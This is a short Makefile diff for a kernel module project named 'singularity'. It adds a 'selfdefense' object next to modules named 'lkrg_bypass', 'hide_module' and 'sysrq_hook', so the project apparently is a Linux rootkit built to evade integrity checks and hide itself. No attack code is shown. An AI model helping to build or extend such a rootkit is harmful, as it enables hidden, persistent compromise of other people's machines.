@@ -18,6 +18,7 @@ singularity-objs := main.o \
     modules/task.o \
     modules/lkrg_bypass.o \
     modules/sysrq_hook.o \
+    modules/selfdefense.o \
     modules/hide_module.o modules/trace.o ftrace/ftrace_helper.o
 
 all:
